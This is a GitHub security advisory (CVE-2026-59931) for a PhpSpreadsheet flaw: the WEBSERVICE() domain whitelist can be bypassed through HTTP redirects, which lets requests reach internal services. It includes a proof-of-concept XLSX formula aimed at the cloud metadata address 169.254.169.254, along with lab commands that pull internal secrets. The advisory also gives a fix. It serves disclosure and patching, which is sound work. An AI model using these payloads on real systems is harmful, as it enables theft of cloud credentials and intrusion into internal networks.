# [H] PHPSpreadsheet: SSRF bypass via HTTP redirect in WEBSERVICE() domain whitelist

## Summary
Severity: High
Advisory: GHSA-6hq5-7373-42rg
CVE: CVE-2026-59931
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-23
Source: https://github.com/advisories/GHSA-6hq5-7373-42rg
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=4.0.0 <5.8.1
- Packagist: `phpoffice/phpspreadsheet` — affected >=3.3.0 <3.10.7
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.4.7
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.18
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.30.6

## Details
### Summary

The domain whitelist introduced in PhpSpreadsheet 5.4.0 for the `WEBSERVICE()` formula function can be bypassed via HTTP redirect. The whitelist validates only the initial URL's hostname, but `file_get_contents()` follows 302/301 redirects by default without re-validating the redirect target against the whitelist. This allows an attacker to reach internal services through a whitelisted domain that issues an HTTP redirect.

### Details

In `Calculation/Web/Service.php`, the `webService()` method validates the URL's host against a domain whitelist set via `Spreadsheet::setDomainWhiteList()`. If the host passes validation, the method calls `file_get_contents($url, false, $ctx)` to fetch the content.

The stream context does not disable redirect following:

```php
$ctxArray = [
    'http' => [
        'user_agent' => 'Mozilla/5.0 ...',
        // follow_location defaults to true
        // max_redirects defaults to 20
    ],
];
```

PHP's HTTP stream wrapper follows redirects automatically (up to 20 hops by default). The redirect target URL is **not** re-validated against the domain whitelist. An attacker who can trigger a 302 redirect from a whitelisted domain can redirect the request to any arbitrary URL, including internal network addresses.

**Vulnerable code** (`Calculation/Web/Service.php`):

```php
// Whitelist check — runs ONCE on the initial URL
$domainWhiteList = $cell?->getWorksheet()->getParent()?->getDomainWhiteList() ?? [];
$host = $parsed['host'] ?? '';
if (!in_array($host, $domainWhiteList, true)) {
    return ($cell === null) ? null : Functions::NOT_YET_IMPLEMENTED;
}

// HTTP request — follows redirects to ANY destination
$ctx = stream_context_create($ctxArray);
$output = @file_get_contents($url, false, $ctx);
```

Additionally, the whitelist check uses only the hostname from `parse_url()`, ignoring the port. This means whitelisting `example.com` permits access to all ports on that host.

### PoC

**Prerequisites:**
- Application uses PhpSpreadsheet >= 5.4.0
- Application calls `$spreadsheet->setDomainWhiteList([...])` with at least one domain
- Application calls `$cell->getCalculatedValue()` on uploaded XLSX files

**Attack steps:**

1. Identify or control a URL on a whitelisted domain that returns an HTTP 302 redirect (e.g., an open redirect endpoint, or a domain the attacker controls).

2. Craft an XLSX file with a WEBSERVICE formula targeting the redirect URL:

```xml
<c r="A1">
  <f>_xlfn.WEBSERVICE("http://whitelisted-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/")</f>
</c>
```

3. Upload the XLSX to the target application. The calculation engine:
   - Validates `whitelisted-domain.com` against the whitelist — **passes**
   - Calls `file_get_contents("http://whitelisted-domain.com/redirect?url=...")` 
   - `file_get_contents` follows the 302 redirect to `http://169.254.169.254/latest/meta-data/` — **no re-validation**
   - Returns the cloud metadata response as the cell's calculated value

**Lab reproduction:**

```bash
# Setup (PhpSpreadsheet 5.7.0, PHP 8.3)
# App whitelists "trusted-api.example.com"
# Redirect server on trusted-api.example.com:7071 returns 302 → internal target

# Test 1: Direct internal access — BLOCKED by whitelist
=WEBSERVICE("http://127.0.0.1:9090/internal-api/secrets")
→ Result: null (blocked)

# Test 2: Via redirect from whitelisted domain — BYPASS
=WEBSERVICE("http://trusted-api.example.com:7071/redirect-to-internal")
→ Result: {"ssrf":"CONFIRMED","secret":"internal-api-key-LATEST","server":"Linux ..."}
```

Confirmed on PhpSpreadsheet 5.7.0 with PHP 8.3. Confirmed via Burp Collaborator (OOB HTTP interaction received at attacker-controlled domain through the redirect chain).

### Impact

An attacker who can upload XLSX files to an application that uses `setDomainWhiteList()` and `getCalculatedValue()` can:

- **Bypass the domain whitelist** by routing requests through a whitelisted domain that redirects to internal targets
- **Exfiltrate cloud metadata** (AWS/GCP/Azure instance credentials) via `http://169.254.169.254/`
- **Access internal services** not exposed to the internet
- **Port-scan internal networks** via any whitelisted hostname (port is not validated)

This is a full-read SSRF — the complete HTTP response body (up to 32,767 bytes) is returned to the attacker as the cell's calculated value.

**Attack scenarios:**
- Whitelisted domain has an open redirect vulnerability
- Attacker controls the whitelisted domain (e.g., a free-tier API service)
- DNS rebinding after the whitelist check

### Suggested Fix

Disable redirect following in the stream context:

```php
$ctxArray = [
    'http' => [
        'user_agent' => '...',
        'follow_location' => false,
        'max_redirects' => 0,
    ],
];
```

Alternatively, if redirects must be supported, implement manual redirect following that re-validates each hop's hostname against the domain whitelist.

Additionally, consider including the port in the whitelist check to prevent port scanning of whitelisted hosts.

### Related

This vulnerability is in the same function as the original WEBSERVICE() SSRF (unrestricted in versions < 5.4.0, no CVE assigned), but is a distinct issue: it bypasses the specific mitigation (domain whitelist) that was introduced in PR #4751 to address the original SSRF.

Existing SSRF CVEs in PhpSpreadsheet (CVE-2024-45290, CVE-2024-45291, CVE-2025-54370) are all in the Drawing/image loading code path, not in the WEBSERVICE calculation engine.

---

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hq5-7373-42rg
- https://github.com/PHPOffice/PhpSpreadsheet/commit/7ef7b25e8548a6ded79dac74e2e2c7acdac38d8d
- https://github.com/PHPOffice/PhpSpreadsheet
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/1.30.6
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.1.18
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/2.4.7
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/3.10.7
- https://github.com/PHPOffice/PhpSpreadsheet/releases/tag/5.8.1
